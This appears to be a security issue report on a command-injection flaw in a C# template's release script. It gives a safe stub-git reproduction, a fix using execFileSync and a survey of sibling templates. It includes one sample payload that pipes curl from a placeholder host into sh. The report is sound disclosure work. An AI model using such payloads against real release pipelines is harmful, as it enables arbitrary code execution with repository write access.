
### Summary

`scripts/version-and-commit.mjs:69-74` runs commands as strings:

```js
function exec(command, silent = false) {
  return execSync(command, {
    encoding: 'utf-8',
    stdio: silent ? 'pipe' : 'inherit',
  });
}
```

`execSync` given a string runs it through `/bin/sh -c`. The two release sites build that string by concatenation, escaping the double quote and nothing else:

```js
// :409-412
const commitMsg = description
  ? `chore: release ${releaseTag}\n\n${description}`
  : `chore: release ${releaseTag}`;
exec(`git commit -m "${commitMsg.replace(/"/g, '\\"')}"`);

// :417-419
const tagMsg = description
  ? `Release ${releaseTag}\n\n${description}`
  : `Release ${releaseTag}`;
exec(`git tag -a ${releaseTag} -m "${tagMsg.replace(/"/g, '\\"')}"`);
```

`description` is `--description` (`:46`), the value an operator types into the release dispatch form. Escaping `"` does nothing to `$( )` or to backticks, and inside double quotes both still expand. So a description of

```
$(curl -s https://example.invalid/x | sh)
```

is executed by the shell `execSync` starts — once while building the commit message and once while building the tag message — in a job that holds a `contents: write` token.

There is a second, quieter consequence: the shell consumes the substitution before `git` sees it, so the release commit and the tag silently lose the description the operator typed. The reproduction below shows exactly that, `git commit -m chore: release v0.3.17` with the description gone.

### This is not the same defect as the workflow-level one

[csharp#53](https://github.com/link-foundation/csharp-ai-driven-development-pipeline-template/issues/53) covers `release.yml` pasting `${{ github.event.inputs.description }}` into the step's script. Reading the input through `env:` fixes *that* — it stops the runner from substituting into the script text. It does **not** fix this one: the value still arrives on this script's argv, and this script still concatenates it into a command string. Both fixes are needed, and this one is the cheaper of the two.

### Reproduction

No CI, no network, nothing real committed: a stub `git` on `PATH` makes the payload the only thing that can write the proof file, and records the argv `git` was handed. `experiments/issue-123/repro-csharp-exec-escaping.sh` (attached below) copies the checkout, installs the stub, and runs the *shipped* script:

```bash
cat > bin/git <<'STUB'
#!/bin/sh
case "$*" in
  *"diff --cached --quiet"*) exit 1 ;;   # "there are changes to commit"
  *"rev-parse --verify"*) exit 1 ;;      # "the tag does not exist yet"
esac
printf 'git %s\n' "$*" >> "${GIT_STUB_LOG}"
exit 0
STUB

PATH="$PWD/bin:$PATH" node scripts/version-and-commit.mjs \
  --mode instant --bump-type patch --description '$(printf INJECTED >> /tmp/proof)'
```

Measured against `83efb9e4482ffed9c9ef1c7b07ea250ac6d3b141`:

```
### csharp @ 83efb9e4 -- the shipped script, with a stub git
  script exit=0
  what the script printed:
    Updated csproj to version 0.3.17
    Updated CHANGELOG.md with version 0.3.17
    Committed version 0.3.17
    Created tag v0.3.17
    Pushed changes and tags
  what the stub git was asked to run:
    git config user.name github-actions[bot]
    git config user.email github-actions[bot]@users.noreply.github.com
    git add src/MyPackage/MyPackage.csproj CHANGELOG.md .changeset/
    git commit -m chore: release v0.3.17
    git tag -a v0.3.17 -m Release v0.3.17
    git push
    git push --tags
  REPRODUCED  the description executed: proof file holds 2 INJECTED marker(s)
              (:412 builds the commit message, :419 the tag message -- one execution each)
```

Two markers, because the payload is executed once per call site. The script reports success throughout.

### Reachability

`--description` is supplied by the operator dispatching `release.yml` (`release.yml:617`). In changeset mode the descriptions parsed out of changeset files do **not** reach `commitMsg` — `:336-358` writes them to `CHANGELOG.md` and builds the commit message from the version alone — so a pull request author cannot reach this site. It is operator-reachable, the same standing as csharp#53: it turns "may trigger a release" into "may run arbitrary code in a job holding `contents: write`", for a human with write access, for a bot or app with `actions: write`, and for any token that leaks.

### Workaround

Until the fix lands, nothing at the repository level — an operator can only avoid typing a description containing `$`, a backtick or a newline. Treat the release dispatch form as privileged.

### Suggested fix

Pass the message as an argument instead of as command text. `execFileSync` takes an argv array and starts no shell, so nothing in the message is ever parsed:

```diff
-import { execSync } from 'child_process';
+import { execSync, execFileSync } from 'child_process';

+/**
+ * Run a command with its arguments passed as argv, so no shell parses them.
+ * @param {string} file
+ * @param {string[]} args
+ * @param {boolean} silent
+ * @returns {string}
+ */
+function execArgs(file, args, silent = false) {
+  return execFileSync(file, args, {
+    encoding: 'utf-8',
+    stdio: silent ? 'pipe' : 'inherit',
+  });
+}

-  exec(`git commit -m "${commitMsg.replace(/"/g, '\\"')}"`);
+  execArgs('git', ['commit', '-m', commitMsg]);

-  exec(`git tag -a ${releaseTag} -m "${tagMsg.replace(/"/g, '\\"')}"`);
+  execArgs('git', ['tag', '-a', releaseTag, '-m', tagMsg]);
```

The `rust` template already does exactly this and is worth copying: `scripts/version-and-commit.rs:1256` is `exec("git", &["commit", "-m", &commit_msg])` and `:1316` is `exec("git", &["tag", "-a", &tag_name, "-m", &tag_msg])`. `python` (`version_and_commit.py:347`, a `subprocess` list) and `php` (`src/Git.php:39`/`:44`, an argv array escaped element by element) are the same shape.

Two things worth doing at the same time:

- **`git add` at `:393` has the same construction** — `exec(\`git add ${CSPROJ_PATH} ${CHANGELOG_FILE} ${CHANGESET_DIR}/\`)`. Those three are derived from `CSHARP_ROOT`, which is an environment variable, so the value is not an operator's free text today; it is still a path pasted unquoted into a command line, and `execArgs('git', ['add', CSPROJ_PATH, CHANGELOG_FILE, `${CHANGESET_DIR}/`])` costs nothing.
- **Keep the escaping question out of the code entirely.** Every remaining `exec(\`...\`)` in this file interpolates something; converting the call sites that take a value rather than a literal removes the class rather than the instance.

### Relation to earlier work

Found while auditing every CI/CD false positive and false negative in `link-foundation/box` ([box#123](https://github.com/link-foundation/box/issues/123)), which compares this template's full workflow and script tree against ours, file by file.

We asked the same question of all seven templates. The construction appears in `js` (`version-and-commit.mjs:293`), `go` (`:315`, `:321`) and `java` (`:326`, `:329`) too, but in all three the message is derived from the version, so no operator text reaches it — and `rust`, `python` and `php` use argv forms that cannot be injected whatever the message contains. `csharp` is the only template that combines a command string with operator-supplied text, so this report goes here alone. `java` is worth a footnote for its own maintainers: `exec(\`git commit -m "${commitMessage}" || echo "Nothing to commit"\`)` has no escaping at all, so it is one edit — a message that carries text — away from the same defect.

### The fixtures, so this is runnable without cloning `box`

<details>
<summary><code>experiments/issue-123/repro-csharp-exec-escaping.sh</code></summary>

```bash
#!/usr/bin/env bash
# Reproduce: the C# template's scripts/version-and-commit.mjs builds its `git
# commit` and `git tag` command lines by string concatenation, escaping only the
# double quote, and hands the result to execSync -- which runs it through
# /bin/sh -c. A `--description` containing `$( )` or backticks is therefore
# executed, twice: once for the commit message and once for the tag message.
#
# This is a *separate* defect from the workflow-level template injection
# (see repro-dispatch-description-injection.sh). Reading the input through
# `env:` in release.yml does not close it: the value still arrives on argv, and
# the script still concatenates it into a command string.
#
# Section 1 runs the template's own shipped script with a stub `git` on PATH, so
# nothing real is committed and the payload's only observable effect is a file
# it writes. Section 2 asks the same question of the other six templates, since
# the point of the audit is that a defect found once has to be looked for
# everywhere.
#
# Usage:
#   bash experiments/issue-123/repro-csharp-exec-escaping.sh TEMPLATE_DIR...
# where each TEMPLATE_DIR is a checkout of one of the
# link-foundation/*-ai-driven-development-pipeline-template repositories.
set -uo pipefail

work="$(mktemp -d)"
trap 'rm -rf "${work}"' EXIT
mkdir -p "${work}/bin"

proof="${work}/proof"
: >"${proof}"

# Enough git for the script to reach its commit step, and a record of what it
# was asked to run. `git diff --cached --quiet` must report changes (exit 1) so
# the script does not decide there is nothing to commit, and `git rev-parse
# --verify` must report the tag as absent.
cat >"${work}/bin/git" <<'STUB'
#!/bin/sh
case "$*" in
  *"diff --cached --quiet"*) exit 1 ;;
  *"rev-parse --verify"*) exit 1 ;;
esac
printf 'git %s\n' "$*" >> "${GIT_STUB_LOG}"
exit 0
STUB
chmod +x "${work}/bin/git"

csharp_dir=""
for dir in "$@"; do
  [ "$(basename "${dir}")" = csharp ] && csharp_dir="${dir}"
done

reproduced=0

if [ -n "${csharp_dir}" ]; then
  echo "### csharp @ $(cd "${csharp_dir}" && git rev-parse --short=8 HEAD) -- the shipped script, with a stub git"
  echo "### scripts/version-and-commit.mjs --mode instant --bump-type patch --description '\$(printf INJECTED >> proof)'"
  fixture="${work}/csharp"
  cp -r "${csharp_dir}" "${fixture}"
  : >"${work}/git-stub.log"
  (cd "${fixture}" && PATH="${work}/bin:${PATH}" GIT_STUB_LOG="${work}/git-stub.log" \
    node scripts/version-and-commit.mjs --mode instant --bump-type patch \
    --description '$(printf INJECTED >> '"${proof}"')') >"${work}/csharp.out" 2>&1
  status=$?
  echo "  script exit=${status}"
  echo "  what the script printed:"
  sed 's/^/    /' "${work}/csharp.out"
  echo "  what the stub git was asked to run:"
  sed 's/^/    /' "${work}/git-stub.log"
  markers="$(tr -cd 'A-Z' <"${proof}" | awk '{ n = gsub(/INJECTED/, ""); print n }')"
  if [ -s "${proof}" ]; then
    echo "  REPRODUCED  the description executed: proof file holds ${markers:-0} INJECTED marker(s)"
    echo "              (:412 builds the commit message, :419 the tag message -- one execution each)"
    reproduced=1
  else
    echo "  inert       the description did not execute"
  fi
  echo
fi

# ------------------------------------------------------ the same shape elsewhere
# Every template builds a release commit and an annotated tag. Two questions
# decide whether the same defect is present: does the message reach the command
# as an argument or as command text, and can the message carry text the operator
# supplied? Both have to be answered, which is why the verdicts differ between
# templates whose code looks alike.
echo "### the same construction in every template"
survey() {
  local name="$1" verdict="$2" file="$3" pattern="$4"
  echo "  ${name}: ${verdict}"
  grep -nE "${pattern}" "${file}" | sed 's/^/      /'
}

for dir in "$@"; do
  name="$(basename "${dir}")"
  case "${name}" in
    csharp)
      survey csharp "command STRING, and the message carries --description -- INJECTABLE" \
        "${dir}/scripts/version-and-commit.mjs" 'git commit -m|git tag -a'
      ;;
    js)
      survey js "command string via zx/command-stream, but the message is the version -- no untrusted text" \
        "${dir}/scripts/version-and-commit.mjs" 'git commit -m'
      ;;
    go)
      survey go "command string, but the message is built from the version -- no untrusted text" \
        "${dir}/scripts/version-and-commit.mjs" 'git commit -m|git tag -a'
      ;;
    java)
      survey java "command string with NO escaping at all, but the message is built from the version -- no untrusted text" \
        "${dir}/scripts/version-and-commit.mjs" 'git commit -m|git tag -a'
      ;;
    rust)
      survey rust "argv, message passed as one element -- safe whatever it contains" \
        "${dir}/scripts/version-and-commit.rs" '"commit", "-m"|"tag", "-a"'
      ;;
    python)
      survey python "argv list, no shell -- safe whatever it contains" \
        "${dir}/scripts/version_and_commit.py" '"git", "commit"|"git", "tag"'
      ;;
    php)
      survey php "argv array, each element escapeshellarg'd -- safe whatever it contains" \
        "${dir}/scripts/src/Git.php" "'git', 'commit'|'git', 'tag'"
      ;;
  esac
done

echo
echo "reproduced ${reproduced} script-level injection(s)"
[ "${reproduced}" -gt 0 ] || exit 1
```

</details>

